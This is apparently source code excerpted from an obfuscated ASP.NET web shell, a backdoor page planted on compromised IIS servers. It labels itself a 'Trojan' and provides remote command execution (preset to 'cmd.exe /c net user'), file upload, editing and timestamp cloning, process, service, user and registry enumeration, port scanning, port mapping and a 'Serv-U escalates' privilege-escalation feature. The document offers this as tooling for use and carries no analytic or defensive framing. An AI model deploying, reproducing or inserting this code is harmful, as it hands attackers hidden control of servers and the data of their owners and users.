...
Bin_Button_KillMe.Attributes["onClick"]="if(confirm('Determined to commit suicide?')){Bin_PostBack('hae','');};";
...
ZGKh.Text="<a href=\"javascript:if(confirm('Are you sure you want to delete this file (folder) ?')){Bin_PostBack('kRXgt','"+MVVJ(AXSbb.Value+Bin_folder.Name)+"')};\">delete</a> | <a href='#' onclick=\"var filename=prompt('Please enter the folder name:','"+AXSbb.Value.Replace(@"\",@"\\")+Bin_folder.Name.Replace("'","\\'")+"');if(filename){Bin_PostBack('dAJTD"+MVVJ(AXSbb.Value+Bin_folder.Name)+"',filename);} \">Rename</a>";
tr.Cells.Add(ZGKh);
UGzP.Rows.Add(tr);
}
...
GLpi.Text="<a href=\"#\" onclick=\"Bin_PostBack('ksGR','"+MVVJ(AXSbb.Value+Bin_Files.Name)+"')\">download</a> | <a href='#' onclick=\"var filename=prompt('Please enter a new file name:','"+AXSbb.Value.Replace(@"\",@"\\")+Bin_Files.Name.Replace("'","\\'")+"');if(filename){Bin_PostBack('Bin_CFile"+MVVJ(AXSbb.Value+Bin_Files.Name)+"',filename);} \">copy</a> | <a href=\"#\" onclick=\"Bin_PostBack('Bin_Editfile','"+Bin_Files.Name+"')\">edit</a> | <a href='#' onclick=\"var filename=prompt('Please enter a new file name:','"+AXSbb.Value.Replace(@"\",@"\\")+Bin_Files.Name.Replace("'","\\'")+"');if(filename){Bin_PostBack('Tlvz"+MVVJ(AXSbb.Value+Bin_Files.Name)+"',filename);} \">rename</a> | <a href=\"#\" onclick=\"Bin_PostBack('cYAl','"+Bin_Files.Name+"')\">Modify file attributes</a> ";
...
lGV.Text=vLlH+" Folder / "+aYRwo+" file";
}
oWam.Cells.Add(lGV);
}
UGzP.Rows.Add(oWam);
...
Bin_H2_Title.InnerHtml="Create/edit files >>";
WICxe();
vrFA.Visible=true;
if(path.IndexOf(":")< 0)
{
...
{
Bin_H2_Title.InnerHtml="The last modified time of the cloned file >>";
WICxe();
zRyG.Visible=true;
...
try
{
Bin_H2_Title.InnerText="System process >>";
WICxe();
DCbS.Visible=true;
int UEbTI=0;
...
try
{
Bin_H2_Title.InnerText="System service >>";
WICxe();
iQxm.Visible=true;
int UEbTI=0;
...
WICxe();
xWVQ.Visible=true;
Bin_H2_Title.InnerText="User (group) information >>";
...
WICxe();
ghaB.Visible=true;
Bin_H2_Title.InnerText="system message >>";
Bin_H2_Mac.InnerText="Network card information >>";
Bin_H2_Driver.InnerText="Drive information >>";
...
WICxe();
APl.Visible=true;
Bin_H2_Title.InnerText="Serv-U Power >>";
}
public void lDODR()
{
...
WICxe();
kkHN.Visible=true;
Bin_H2_Title.InnerText="Registry query >>";
...
WICxe();
YwLB.Visible=true;
Bin_H2_Title.InnerText="Port scanning >>";
}
public void rAhe()
{
WICxe();
...
WICxe();
hOWTm.Visible=true;
Bin_H2_Title.InnerText="Port Mapping >>";
}
...
{
Bin_H2_Title.InnerText="IIS detection >>";
WICxe();
VNR.Visible=true;
AdCx();
}
...
WICxe();
vIac.Visible=true;
Bin_H2_Title.InnerText="Excuting an order >>";
}
...
<asp:LinkButton ID="UtkN" runat="server" OnClick="YKpI" Text="sign out" ></asp:LinkButton> | <asp:LinkButton ID="RsqhW" runat="server" Text="File (folder) management" OnClick="Ybg"></asp:LinkButton> | <asp:LinkButton ID="xxzE" runat="server" Text="Cmd command" OnClick="VOxn"></asp:LinkButton> | <asp:LinkButton ID="nuc" runat="server" Text="IIS detection" OnClick="KjPi"></asp:LinkButton> | <asp:LinkButton ID="OREpx" runat="server" Text="System process" OnClick="Grxk"></asp:LinkButton> | <asp:LinkButton ID="jHN" runat="server" Text="system service" OnClick="ilC"></asp:LinkButton> | <asp:LinkButton ID="PHq" runat="server" Text="User (group) information" OnClick="Olm"></asp:LinkButton> | <asp:LinkButton ID="wmgnK" runat="server" Text="system message" OnClick="HtB"></asp:LinkButton> | <asp:LinkButton ID="FeV" runat="server" Text="File search" OnClick="PPtK"></asp:LinkButton> | <asp:LinkButton ID="PVQ" runat="server" Text="Serv-U escalates" OnClick="jXhS"></asp:LinkButton> | <asp:LinkButton ID="jNDb" runat="server" Text="Registry query" OnClick="xSy"></asp:LinkButton> | <asp:LinkButton ID="HDQ" runat="server" Text="Port scanning" OnClick="cptS" ></asp:LinkButton> | <asp:LinkButton ID="AoI" runat="server" Text="Database management" OnClick="dMx"></asp:LinkButton> | <asp:LinkButton ID="KHbEd" runat="server" Text="Port Mapping" OnClick="fDO"></asp:LinkButton>
</td>
</tr>
</table>
</div>
...
<asp:Button ID="RvPp" CssClass="bt" runat="server" Text="Upload" OnClick="lbjLD"/></div><asp:LinkButton ID="OLJFp" runat="server" Text="Website Directory" OnClick="mcCY"></asp:LinkButton> | <a href="#" id="Bin_Button_CreateDir" runat="server">Trojan directory</a> | <a href="#" id="Bin_Button_CreateFile" runat="server">New directory</a>
 | <span id="Bin_Span_Drv" runat="server"></span><a href="#" id="Bin_Button_KillMe" runat="server" style="color:Red">Trojan suicide</a>
</td></tr>
<asp:Table ID="UGzP" runat="server" Width="100%" CellSpacing="0" >
<asp:TableRow CssClass="head"><asp:TableCell>&nbsp;</asp:TableCell><asp:TableCell>File (clip) name</asp:TableCell><asp:TableCell Width="25%">Last Modified</asp:TableCell><asp:TableCell Width="15%">Size</asp:TableCell><asp:TableCell Width="25%">operating</asp:TableCell></asp:TableRow>
</asp:Table>
</table>
</div>
<%--FileEdit--%>
<div id="vrFA" runat="server">
<p>Current file (create new file name and new file)<br/>
...
<p>document content<br/>
<textarea id="Xgvv" runat="server" class="area" cols="100" rows="25" enableviewstate="true" ></textarea>
</p>
<p><asp:Button ID="JJjbW" runat="server" Text="submit" CssClass="bt" OnClick="DGCoW"/> <asp:Button ID="iCNu" runat="server" Text="return" CssClass="bt" OnClick="IkkO"/></p>
</div>
<%--CloneTime--%>
<div id="zRyG" runat="server" enableviewstate="false" visible="false">
<p>Modify the file<br/><input class="input" id="QiFB" type="text" size="120" runat="server"/></p>
<p>reference document<br/><input class="input" id="lICp" type="text" size="120" runat="server"/></p>
...
<p>
<asp:CheckBox ID="ZhWSK" runat="server" Text="Read only" EnableViewState="False"/>
&nbsp;
<asp:CheckBox ID="SsR" runat="server" Text="system" EnableViewState="False"/>
&nbsp;
<asp:CheckBox ID="ccB" runat="server" Text="hide" EnableViewState="False"/>
&nbsp;
<asp:CheckBox ID="fbyZ" runat="server" Text="Archiving" EnableViewState="False"/>
</p>
<p>
Creation time :
...
<div runat="server" id="vIac">
 ...
 Statements:<br/>
 <input class="input" runat="server" id="bkcm" value="/c Set" type="text" size="100"/> <asp:Button ID="YrqL" CssClass="bt" runat="server" Text="carried out" OnClick="FbhN"/>
...
<table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;">
 ...
 <tr >
 <td style="width:10%"></td>
 <td colspan="5">CmdShell&nbsp;&nbsp;:&nbsp;<input class="input" runat="server" id="mHbjB" type="text" size="100" value="cmd.exe /c net user"/> <asp:Button ID="SPhc" CssClass="bt" runat="server" Text="carried out" OnClick="lRfRj"/></td>
 </tr>
</table>
...
<td style="width:20%" align="left">Remote Ip : <input class="input" runat="server" id="llH" type="text" size="20" value="127.0.0.1"/></td>
<td style="width:20%" align="left">Remote port : <input class="input" runat="server" id="ZHS" type="text" size="20" value="80"/></td></tr>
<tr align="center"><td colspan="5"><br/><asp:Button ID="FJE" CssClass="bt" runat="server" Text="Map port" OnClick="wDZ"/> <asp:Button ID="giX" CssClass="bt" runat="server" Text="Clear all" OnClick="vJNsE"/> <asp:Button ID="GFsm" CssClass="bt" runat="server" Text="Refresh" OnClick="tYoZ"/></td></tr></table></div>
<%--Search--%>
<div id="yhv" runat="server">
<table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;">
<tr align="center">
<td style="width:20%" align="left">Key words</td>
<td style="width:60%" align="left"><textarea id="iaMKl" runat="server" class="area" style="width:100%" rows="4"></textarea></td>
<td style="width:20%" align="left"><input type="checkbox" runat="server" id="rAQ" value="1"/> Use regular expressions</td>
</tr>
<tr align="center">
<td style="width:20%" align="left">replace</td>
...
<tr align="center">
<td style="width:20%" align="left">Search file type</td>
...
<td style="width:20%" align="left"><asp:DropDownList runat="server" ID="Ven" AutoPostBack="False" CssClass="list"><asp:ListItem Value="name">file name</asp:ListItem><asp:ListItem Value="content" Selected="True">document content</asp:ListItem></asp:DropDownList></td>
</tr>
<tr align="center">
